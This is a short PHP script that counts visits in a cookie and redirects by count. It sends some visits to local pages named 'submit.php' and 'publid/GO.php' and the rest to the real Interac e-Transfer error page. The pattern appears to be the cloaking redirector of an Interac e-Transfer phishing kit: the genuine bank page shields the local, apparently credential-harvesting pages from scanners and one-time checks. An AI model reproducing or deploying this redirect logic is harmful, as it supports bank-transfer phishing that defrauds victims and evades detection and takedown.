
<?php

// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count >= 2 && $visit_count < 3) {
  header("Location: submit.php");
} elseif ($visit_count >= 3 && $visit_count < 4) {
  header("Location: submit.php");
} elseif ($visit_count >= 4 && $visit_count < 10) {
  header("Location: publid/GO.php");
} else {
    header('Location: https://etransfer.interac.ca/error/');
}

exit;
